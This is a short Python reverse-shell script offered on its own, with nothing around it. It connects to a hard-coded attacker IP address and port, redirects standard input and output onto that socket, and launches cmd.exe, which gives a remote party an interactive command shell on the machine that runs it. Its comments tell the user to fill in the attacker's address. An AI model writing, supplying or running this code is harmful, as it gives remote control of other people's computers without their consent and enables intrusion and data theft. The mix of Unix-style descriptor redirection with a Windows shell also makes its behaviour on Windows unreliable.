import socket
import subprocess
import os
import sys

attacker_ip = '192.168.1.137'  # Replace with the attacker's IP address
attacker_port = 4444           # Replace with the attacker's listening port

# Create a socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
except Exception as e:
    print(f"Failed to connect: {e}")
    sys.exit(1)

# Redirect input/output to the socket
os.dup2(s.fileno(), 0)  # Redirect stdin
os.dup2(s.fileno(), 1)  # Redirect stdout
os.dup2(s.fileno(), 2)  # Redirect stderr

# Start a command shell (Windows uses cmd.exe or powershell)
subprocess.call(['cmd.exe', '/K', 'echo Connection established.'])
